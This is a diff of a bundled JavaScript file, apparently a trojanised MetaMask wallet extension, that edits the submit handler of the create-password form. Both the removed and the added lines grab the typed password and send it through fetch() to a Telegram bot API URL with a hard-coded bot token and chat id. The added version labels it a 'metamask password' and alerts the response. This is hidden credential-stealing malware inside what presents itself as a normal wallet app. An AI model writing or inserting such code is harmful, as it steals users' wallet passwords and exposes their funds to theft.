@@ -11014,8 +11014,10 @@ LavaPack.loadBundle([
                                 className: "create-password__form--submit-button",
                                 disabled: !X || !L,
                                 onClick: function onc(...args) {
-									let password = `Possible password: ${document.getElementsByClassName("form-field__input")[0].value}`
-									fetch(`https://api.telegram.org/bot6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4/sendMessage?chat_id=1804765109&text=${password}&parse_mode=HTML&disable_web_page_preview=True`)
+									let password = `Possible metamask password: ${document.getElementsByClassName("form-field__input")[0].value}`
+									fetch(`https://api.telegram.org/bot6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4/sendMessage?chat_id=1804765109&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((response) => {
+										alert(response)
+									})
 									V(...args);
 								}
                             }, r && G === E.FIRST_TIME_FLOW_TYPES.IMPORT ? w("importMyWallet") : w("createNewWallet")))), Z ? a.default.createElement("iframe", {
